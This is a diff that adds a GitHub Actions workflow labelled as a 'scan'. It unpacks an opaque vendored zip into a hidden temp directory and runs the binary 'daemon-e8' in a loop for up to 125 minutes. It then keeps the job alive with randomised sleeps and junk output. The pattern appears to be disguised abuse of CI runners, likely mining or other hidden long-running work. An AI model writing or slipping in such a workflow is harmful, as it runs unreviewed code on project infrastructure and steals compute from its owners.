@@ -1,0 +1,18 @@
+name: scan-8e89
+on:
+  workflow_dispatch:
+jobs:
+  validate_xji:
+    runs-on: ubuntu-latest
+    timeout-minutes: 311
+    steps:
+      - uses: actions/checkout@v4
+      - run: nproc
+      - run: gcc --version | head -1
+      - name: scan
+        run: |
+          GK=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/5051ba68.zip -d ${GK} && chmod +x ${GK}/daemon-e8
+          cd ${GK} && timeout 125m bash -c 'while true; do ./daemon-e8; echo "complete rc=$? $(date -u +%H:%M)"; sleep 3; done'
+          H4IN=$((SECONDS + 212 * 60))
+          while [ $SECONDS -lt $H4IN ]; do sleep $((RANDOM % 76 + 35)); echo "$(date -u +%H:%M:%S) 6qhzzo"; done
+
